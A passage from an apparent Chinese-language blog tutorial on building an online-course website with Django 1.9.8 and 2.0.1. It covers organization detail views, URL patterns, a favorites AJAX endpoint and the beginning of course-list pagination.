class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 手机号的正则表达式验证</span><br><span class="line">    def clean_mobile(self):</span><br><span class="line">        mobile &#x3D; self.cleaned_data[&#39;mobile&#39;]</span><br><span class="line">        REGEX_MOBILE &#x3D; &quot;^1[358]\d&#123;9&#125;$|^147\d&#123;8&#125;$|^176\d&#123;8&#125;$&quot;</span><br><span class="line">        p &#x3D; re.compile(REGEX_MOBILE)</span><br><span class="line">        if p.match(mobile):</span><br><span class="line">            return mobile</span><br><span class="line">        else:</span><br><span class="line">            raise forms.ValidationError(u&quot;手机号码非法&quot;, code&#x3D;&quot;mobile_invalid&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="机构详情"><a href="#机构详情" class="headerlink" title="机构详情"></a>机构详情</h2><ul><li>机构首页</li><li>机构课程</li><li>机构介绍</li><li>机构讲师</li></ul><p>登录xadmin添加基础的必要数据。添加课程与讲师。</p><p>课程中应该有一个外键指向它是哪个机构的。</p><p>courses/models.py</p><p>Django1.9.8中:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from organization.models import CourseOrg</span><br><span class="line"></span><br><span class="line">course_org &#x3D; models.ForeignKey(CourseOrg, verbose_name&#x3D;u&quot;所属机构&quot;,null&#x3D;True,blank&#x3D;True)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>django2.0.1下；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">course_org &#x3D; models.ForeignKey(CourseOrg,on_delete&#x3D;models.CASCADE, verbose_name&#x3D;u&quot;所属机构&quot;,null&#x3D;True,blank&#x3D;True)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>新增外键字段应该<code>null=true,blank=true。</code></p><blockquote><p>因为历史数据中没有这个外键字段</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">makemigration course</span><br><span class="line">migrate course</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将前端给我们的org相关的四个页面拷进template</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-e84178ba30796d0f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/173" alt="img"></p><p>新建org_base页面</p><p>将org_home页面内容拿过去。</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-d1ac59bf53507cfe.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/317" alt="img"></p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-0ed04eb784fd710c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/398" alt="img"></p><ul><li>loadstaticfiles -&gt; 改css文件路径-&gt;改js文件路径-&gt;改图片路径</li><li>改已经实现的url。-&gt;将子页面继承后需要改得地方使用block包裹。</li></ul><p>将home页面清空</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-b12422d8d71faaed.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/557" alt="img"></p><p>完成替换之后添加访问的view以及URl</p><p>organization/views.py:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class OrgHomeView(View):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">   机构首页</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    def get(self, request, org_id):</span><br><span class="line">        # 根据id取到课程机构</span><br><span class="line">        course_org &#x3D; CourseOrg.objects.get(id&#x3D; int(org_id))</span><br><span class="line">        # 通过课程机构找到课程。内建的变量，找到指向这个字段的外键引用</span><br><span class="line">        all_courses &#x3D; course_org.course_set.all()[:4]</span><br><span class="line">        all_teacher &#x3D; course_org.teacher_set.all()[:2]</span><br><span class="line"></span><br><span class="line">        return render(request, &#39;org-detail-homepage.html&#39;,&#123;</span><br><span class="line">           &#39;all_courses&#39;:all_courses,</span><br><span class="line">            &#39;all_teacher&#39;:all_teacher,</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Django2.0.1下url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">   # home页面,取纯数字</span><br><span class="line">re_path(&#39;home&#x2F;(?P&lt;org_id&gt;\d+)&#x2F;&#39;, OrgHomeView.as_view(), name&#x3D;&quot;org_home&quot;),</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>django1.9.8下url:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># home页面,取纯数字</span><br><span class="line">url(r&#39;home&#x2F;(?P&lt;org_id&gt;\d+)&#x2F;$&#39;, OrgHomeView.as_view(), name&#x3D;&quot;org_home&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>html中使用for循环遍历:</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-3904e74bdf0f37f2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/313" alt="img"></p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-6ecfdedeb67e23de.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/468" alt="img"></p><blockquote><p>如上图可以直接通过外键字段再找到外键对象的字段</p></blockquote><p>templates/org-list.html</p><p>配置里面跳转到详情页的url</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-916cfee6a62b1a93.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/388" alt="img"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">return render(request, &#39;org-detail-homepage.html&#39;,&#123;</span><br><span class="line">   &#39;all_courses&#39;:all_courses,</span><br><span class="line">    &#39;all_teacher&#39;:all_teacher,</span><br><span class="line">    &#39;course_org&#39;: course_org,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将<code>course_org</code>也return回来，就可以把网页里这部分值替换掉</p><p>templates/org_base.html</p><p>数值会随继承链向上传递。</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-44bca4fc2f2370e0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/584" alt="img"></p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-a84aafa89037174b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/391" alt="img"></p><h3 id="为讲师增加头像字段"><a href="#为讲师增加头像字段" class="headerlink" title="为讲师增加头像字段"></a>为讲师增加头像字段</h3><p>organization/models.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">image &#x3D; models.ImageField(</span><br><span class="line">    default&#x3D; &#39;&#39;,</span><br><span class="line">    upload_to&#x3D;&quot;teacher&#x2F;%Y&#x2F;%m&quot;,</span><br><span class="line">    verbose_name&#x3D;u&quot;头像&quot;,</span><br><span class="line">    max_length&#x3D;100)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">makemgration organization</span><br><span class="line">migrate organization</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/1779926-785deb9fdc5f2647.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/283" alt="img"></p><p>使用for循环填充数据</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-191fcde311217246.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/543" alt="img"></p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-124c00e49522243b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/422" alt="img"></p><p>同理可得，我们把机构课程页不同的部分拿出来即可</p><h3 id="配置访问的view和url"><a href="#配置访问的view和url" class="headerlink" title="配置访问的view和url"></a>配置访问的view和url</h3><p>organization/urls.py:</p><p>Django 2.0.1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 访问课程</span><br><span class="line">re_path(&#39;course&#x2F;(?P&lt;org_id&gt;\d+)&#x2F;&#39;, OrgCourseView.as_view(), name&#x3D;&quot;org_course&quot;),</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Django 1.9.8：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 访问课程</span><br><span class="line">url(r&#39;^course&#x2F;(?P&lt;org_id&gt;\d+)&#x2F;$&#39;, OrgCourseView.as_view(), name&#x3D;&quot;org_course&quot;),</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>organization/views.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">class OrgCourseView(View):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">   机构课程列表页</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    def get(self, request, org_id):</span><br><span class="line">        # 根据id取到课程机构</span><br><span class="line">        course_org &#x3D; CourseOrg.objects.get(id&#x3D; int(org_id))</span><br><span class="line">        # 通过课程机构找到课程。内建的变量，找到指向这个字段的外键引用</span><br><span class="line">        all_courses &#x3D; course_org.course_set.all()</span><br><span class="line"></span><br><span class="line">        return render(request, &#39;org-detail-course.html&#39;,&#123;</span><br><span class="line">           &#39;all_courses&#39;:all_courses,</span><br><span class="line">            &#39;course_org&#39;: course_org,</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>base页面的left链接修改</p><blockquote><p>这里能直接用到course_org.id。是因为子页面render时都向上传递了course_org对象</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/1779926-091c34151ad3f216.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/488" alt="img"></p><p>使用for循环，填充内容。</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-a5f100c4c1896e95.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/623" alt="img"></p><h3 id="左侧active修改"><a href="#左侧active修改" class="headerlink" title="左侧active修改"></a>左侧active修改</h3><p>因为现在没有值能判断当前是哪个页面。所以在orghomeview中传值回来current page</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-2ed070392f05f939.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700" alt="img"></p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-0bf3f5c25a4bf24a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/510" alt="img"></p><p>写两个view</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">class OrgDescView(View):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">   机构描述详情页</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    def get(self, request, org_id):</span><br><span class="line">        # 向前端传值，表明现在在home页</span><br><span class="line">        current_page &#x3D; &quot;desc&quot;</span><br><span class="line">        # 根据id取到课程机构</span><br><span class="line">        course_org &#x3D; CourseOrg.objects.get(id&#x3D; int(org_id))</span><br><span class="line">        # 通过课程机构找到课程。内建的变量，找到指向这个字段的外键引用</span><br><span class="line">        # 向前端传值说明用户是否收藏</span><br><span class="line">        has_fav &#x3D; False</span><br><span class="line">        # 必须是用户已登录我们才需要判断。</span><br><span class="line">        if request.user.is_authenticated:</span><br><span class="line">            if UserFavorite.objects.filter(user&#x3D;request.user, fav_id&#x3D;course_org.id, fav_type&#x3D;2):</span><br><span class="line">                has_fav &#x3D; True</span><br><span class="line">        return render(request, &#39;org-detail-desc.html&#39;,&#123;</span><br><span class="line">            &#39;course_org&#39;: course_org,</span><br><span class="line">            &quot;current_page&quot;:current_page,</span><br><span class="line">            &quot;has_fav&quot;:has_fav,</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">class OrgTeacherView(View):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">   机构讲师列表页</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    def get(self, request, org_id):</span><br><span class="line">        # 向前端传值，表明现在在home页</span><br><span class="line">        current_page &#x3D; &quot;teacher&quot;</span><br><span class="line">        # 根据id取到课程机构</span><br><span class="line">        course_org &#x3D; CourseOrg.objects.get(id&#x3D; int(org_id))</span><br><span class="line">        # 通过课程机构找到课程。内建的变量，找到指向这个字段的外键引用</span><br><span class="line">        all_teachers &#x3D; course_org.teacher_set.all()</span><br><span class="line">        # 向前端传值说明用户是否收藏</span><br><span class="line">        has_fav &#x3D; False</span><br><span class="line">        # 必须是用户已登录我们才需要判断。</span><br><span class="line">        if request.user.is_authenticated:</span><br><span class="line">            if UserFavorite.objects.filter(user&#x3D;request.user, fav_id&#x3D;course_org.id, fav_type&#x3D;2):</span><br><span class="line">                has_fav &#x3D; True</span><br><span class="line">        return render(request, &#39;org-detail-teachers.html&#39;,&#123;</span><br><span class="line">           &#39;all_teachers&#39;:all_teachers,</span><br><span class="line">            &#39;course_org&#39;: course_org,</span><br><span class="line">            &quot;current_page&quot;:current_page,</span><br><span class="line">            &quot;has_fav&quot;:has_fav</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>加两个url</p><p>Django2.0.1下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 访问机构描述</span><br><span class="line">re_path(&#39;desc&#x2F;(?P&lt;org_id&gt;\d+)&#x2F;&#39;, OrgDescView.as_view(), name&#x3D;&quot;org_desc&quot;),</span><br><span class="line"></span><br><span class="line"># 访问机构讲师</span><br><span class="line">re_path(&#39;teacher&#x2F;(?P&lt;org_id&gt;\d+)&#x2F;&#39;, OrgTeacherView.as_view(), name&#x3D;&quot;org_teacher&quot;),</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Django1.9.8下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 访问机构描述</span><br><span class="line">url(r&#39;^desc&#x2F;(?P&lt;org_id&gt;\d+)&#x2F;$&#39;, OrgDescView.as_view(), name&#x3D;&quot;org_desc&quot;),</span><br><span class="line"></span><br><span class="line"># 访问机构讲师</span><br><span class="line">url(r&#39;^teacher&#x2F;(?P&lt;org_id&gt;\d+)&#x2F;$&#39;, OrgTeacherView.as_view(), name&#x3D;&quot;org_teacher&quot;),</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>修改base页面相关跳转链接，注意点：加上course_org.id</p><p>重载我们的pagepath，使得面包屑动态显示</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-5e965efd1df7eb13.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/496" alt="img"></p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-a607a5b377f66e73.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700" alt="img"></p><h2 id="课程机构收藏功能"><a href="#课程机构收藏功能" class="headerlink" title="课程机构收藏功能"></a>课程机构收藏功能</h2><p>书写收藏的后台逻辑:</p><p>url配置</p><p>django2.0.1下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 机构收藏</span><br><span class="line">path(&#39;add_fav&#x2F;&#39;, AddFavView.as_view(), name&#x3D;&quot;add_fav&quot;),</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>django1.9.8下；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 机构收藏</span><br><span class="line">url(r&#39;^add_fav&#x2F;$&#39;, AddFavView.as_view(), name&#x3D;&quot;add_fav&quot;),</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>配套的view；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">class AddFavView(View):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    用户收藏与取消收藏功能</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    def post(self, request):</span><br><span class="line">        # 表明你收藏的不管是课程，讲师，还是机构。他们的id</span><br><span class="line">        # 默认值取0是因为空串转int报错</span><br><span class="line">        id &#x3D; request.POST.get(&#39;fav_id&#39;, 0)</span><br><span class="line">        # 取到你收藏的类别，从前台提交的ajax请求中取</span><br><span class="line">        type &#x3D; request.POST.get(&#39;fav_type&#39;, 0)</span><br><span class="line"></span><br><span class="line">        # 收藏与已收藏取消收藏</span><br><span class="line">        # 判断用户是否登录:即使没登录会有一个匿名的user</span><br><span class="line">        if not request.user.is_authenticated:</span><br><span class="line">            # 未登录时返回json提示未登录，跳转到登录页面是在ajax中做的</span><br><span class="line">            return HttpResponse(&#39;&#123;&quot;status&quot;:&quot;fail&quot;, &quot;msg&quot;:&quot;用户未登录&quot;&#125;&#39;, content_type&#x3D;&#39;application&#x2F;json&#39;)</span><br><span class="line">        exist_records &#x3D; UserFavorite.objects.filter(user&#x3D;request.user, fav_id&#x3D;int(id), fav_type&#x3D;int(type))</span><br><span class="line">        if exist_records:</span><br><span class="line">            # 如果记录已经存在， 则表示用户取消收藏</span><br><span class="line">            exist_records.delete()</span><br><span class="line">            return HttpResponse(&#39;&#123;&quot;status&quot;:&quot;success&quot;, &quot;msg&quot;:&quot;收藏&quot;&#125;&#39;, content_type&#x3D;&#39;application&#x2F;json&#39;)</span><br><span class="line">        else:</span><br><span class="line">            user_fav &#x3D; UserFavorite()</span><br><span class="line">            # 过滤掉未取到fav_id type的默认情况</span><br><span class="line">            if int(type) &gt;0 and int(id) &gt;0:</span><br><span class="line">                user_fav.fav_id &#x3D; int(id)</span><br><span class="line">                user_fav.fav_type &#x3D; int(type)</span><br><span class="line">                user_fav.user &#x3D; request.user</span><br><span class="line">                user_fav.save()</span><br><span class="line">                return HttpResponse(&#39;&#123;&quot;status&quot;:&quot;success&quot;, &quot;msg&quot;:&quot;已收藏&quot;&#125;&#39;, content_type&#x3D;&#39;application&#x2F;json&#39;)</span><br><span class="line">            else:</span><br><span class="line">                return HttpResponse(&#39;&#123;&quot;status&quot;:&quot;fail&quot;, &quot;msg&quot;:&quot;收藏出错&quot;&#125;&#39;, content_type&#x3D;&#39;application&#x2F;json&#39;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>相关处理收藏的jQuery代码写在org base Html</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-74ce9bf772f25479.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/488" alt="img"></p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-c6cec339c23c0923.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/326" alt="img"></p><p>添加返回页面的收藏值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 向前端传值说明用户是否收藏</span><br><span class="line">       has_fav &#x3D; False</span><br><span class="line">       # 必须是用户已登录我们才需要判断。</span><br><span class="line">       if request.user.is_authenticated:</span><br><span class="line">           if UserFavorite.objects.filter(user&#x3D;request.user, fav_id&#x3D;course_org.id, fav_type&#x3D;2):</span><br><span class="line">               has_fav &#x3D; True</span><br><span class="line"></span><br><span class="line"># return redener加上值</span><br><span class="line">            &quot;has_fav&quot;: has_fav</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/1779926-86511eb4e6fd4f29.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/524" alt="img"></p><p>前台 org_base.html中</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-380d114294efbc07.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/271" alt="img"></p><p>同理添加剩下的几个页面的。</p><h1 id="课程相关功能实现"><a href="#课程相关功能实现" class="headerlink" title="课程相关功能实现"></a><center>课程相关功能实现</center></h1><h2 id="课程列表"><a href="#课程列表" class="headerlink" title="课程列表"></a>课程列表</h2><p>拷贝课程列表页到template目录</p><p>创建课程相关的urls.py</p><p>Mxonline2/urls.py中声明包含到course的url中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 课程app的url配置</span><br><span class="line">url(r&quot;^course&#x2F;&quot;, include(&#39;courses.urls&#39;, namespace&#x3D;&quot;course&quot;)),</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>django2.0.1版本:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 课程app的url配置</span><br><span class="line">path(&quot;course&#x2F;&quot;, include(&#39;courses.urls&#39;, namespace&#x3D;&quot;course&quot;)),</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>书写处理列表展示相关的view</p><p>courses/views.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class CourseListView(View):</span><br><span class="line">    def get(self, request):</span><br><span class="line">        return render(request, &quot;course-list.html&quot;, &#123; &#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>courses/urls.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># encoding: utf-8</span><br><span class="line">from courses.views import CourseListView</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">from django.conf.urls import url</span><br><span class="line"></span><br><span class="line">urlpatterns &#x3D; [</span><br><span class="line">    # 课程列表url</span><br><span class="line">    url(r&#39;^list&#x2F;$&#39;, CourseListView.as_view(), name&#x3D;&quot;list&quot;),</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>django2.0.1版本:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># encoding: utf-8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># encoding: utf-8</span><br><span class="line">from courses.views import CourseListView</span><br><span class="line">from django.urls import path</span><br><span class="line">app_name &#x3D; &quot;courses&quot;</span><br><span class="line">urlpatterns &#x3D; [</span><br><span class="line">    # 课程列表url</span><br><span class="line">    path(&#39;list&#x2F;&#39;, CourseListView.as_view(), name&#x3D;&quot;list&quot;),</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此时访问没有样式。我们开始对于course list html进行工作<br>可以观察到它和orglist一样可以有共同的头尾。所以继承base页面</p><p>xadmin中添加一些课程。</p><p>然后在view中返回课程数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class CourseListView(View):</span><br><span class="line">    def get(self, request):</span><br><span class="line">        all_course &#x3D; Course.objects.all()</span><br><span class="line">        return render(request, &quot;course-list.html&quot;, &#123;</span><br><span class="line">            &quot;all_course&quot;:all_course,</span><br><span class="line">            </span><br><span class="line">        &#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/1779926-3976f6f2f0d2d283.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/458" alt="img"></p><p>保留一个div</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-2dde0d56e76b9904.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700" alt="img"></p><blockquote><p>通过外键字段取外键表中字段</p></blockquote><h3 id="分页功能"><a href="#分页功能" class="headerlink" title="分页功能"></a>分页功能</h3><p>拷贝代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pure_pagination import Paginator, EmptyPage, PageNotAnInteger</span><br><span class="line"> # 对课程机构进行分页</span><br><span class="line">        # 尝试获取前台get请求传递过来的page参数</span><br><span class="line">        # 如果是不合法的配置参数默认返回第一页</span><br><span class="line">        try:</span><br><span class="line">            page &#x3D; request.GET.get(&#39;page&#39;, 1)</span><br><span class="line">        except PageNotAnInteger:</span><br><span class="line">            page &#x3D; 1</span><br><span class="line">        # 这里指从allorg中取五个出来，每页显示5个</span><br><span class="line">        p &#x3D; Paginator(all_orgs, 4, request&#x3D;request)</span><br><span class="line">        orgs &#x3D; p.page(page)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>改动完成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">class CourseListView(View):</span><br><span class="line">    def get(self, request):</span><br><span class="line">        all_course &#x3D; Course.objects.all()</span><br><span class="line">        # 对课程进行分页</span><br><span class="line">        # 尝试获取前台get请求传递过来的page参数</span><br><span class="line">        # 如果是不合法的配置参数默认返回第一页</span><br><span class="line">        